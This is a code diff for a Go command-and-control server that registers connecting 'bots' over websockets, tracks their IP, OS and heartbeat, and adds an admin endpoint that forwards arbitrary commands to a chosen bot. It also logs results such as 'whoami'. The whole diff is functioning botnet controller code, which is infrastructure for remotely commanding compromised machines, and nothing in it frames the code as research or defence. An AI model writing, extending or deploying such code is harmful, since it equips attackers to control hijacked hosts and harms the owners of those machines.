@@ -2,7 +2,9 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
 	"sync"
@@ -15,19 +17,20 @@ import (
 type Bot struct {
 	mu sync.RWMutex
 
-	ID         string `json:"id"`
+	ID         int    `json:"id"`
 	OS         string `json:"os"`
 	IP         string `json:"ip"`
 	LastSeen   time.Time
 	Active     bool
 	BotMessage BotMessage
+	con        *websocket.Conn
 	// Command Command
 }
 
-// type Command struct {
-// 	Cmdname string
-// 	Result  string
-// }
+type Command struct {
+	BotID int    `json:"id"`
+	Cmd   string `json:"cmd"`
+}
 
 type BotMessage struct {
 	Type    string
@@ -35,13 +38,28 @@ type BotMessage struct {
 }
 
 type c2 struct {
-	bots map[string]*Bot
+	mu   sync.RWMutex
+	bots map[int]*Bot
 }
 
 func Newc2() *c2 {
 	return &c2{
-		bots: make(map[string]*Bot),
+		bots: make(map[int]*Bot),
 	}
+}
+
+func (c *c2) registerBot(id int, b *Bot) {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+
+	c.bots[id] = b
+}
+
+func (c *c2) getBot(id int) *Bot {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	return c.bots[id]
+
 }
 
 func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
@@ -63,10 +81,12 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	b.mu.Lock()
+	b.con = con
 	b.LastSeen = time.Now()
 	b.Active = true
-	c.bots[b.ID] = &b
+	c.registerBot(b.ID, &b)
 	b.mu.Unlock()
+
 	fmt.Print(b.ID, b.IP, b.OS, b.LastSeen)
 	for {
 		// var botmsg string
@@ -80,6 +100,9 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 			b.mu.Lock()
 			b.LastSeen = time.Now()
 			b.mu.Unlock()
+		case "whoami":
+			fmt.Println("CMD: ", b.BotMessage.Type, " Result: ", b.BotMessage.Message)
+
 		}
 
 	}
@@ -114,9 +137,50 @@ func heartBeat(con *websocket.Conn, bot *Bot) {
 	}
 
 }
+
+func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
+	cmd := Command{}
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	json.Unmarshal(body, &cmd)
+	// fmt.Println(cmd)
+	bot := c.getBot(cmd.BotID)
+
+	if err = wsjson.Write(context.Background(), bot.con, cmd.Cmd); err != nil {
+		log.Println(err)
+		return
+	}
+
+}
+
 func main() {
+	var wg sync.WaitGroup
+	wg.Add(2)
 	c2 := Newc2()
-	http.HandleFunc("/connect", c2.connectBot)
-	http.ListenAndServe(":4444", nil)
+	adminMux := http.NewServeMux()
+	adminMux.HandleFunc("/executeCommand", c2.SendCommand)
+
+	botMux := http.NewServeMux()
+	botMux.HandleFunc("/connect", c2.connectBot)
+
+	// http.HandleFunc("/executeCommand", c2.SendCommand)
+	go func() {
+		defer wg.Done()
+		if err := http.ListenAndServe("127.0.0.1:9000", adminMux); err != nil {
+			log.Println("Admin Server Error : ", err)
+		}
+	}()
+
+	go func() {
+		defer wg.Done()
+		if err := http.ListenAndServe("127.0.0.1:4444", botMux); err != nil {
+			log.Println("Bot Server Error : ", err)
+		}
+	}()
+
+	wg.Wait()
 
 }
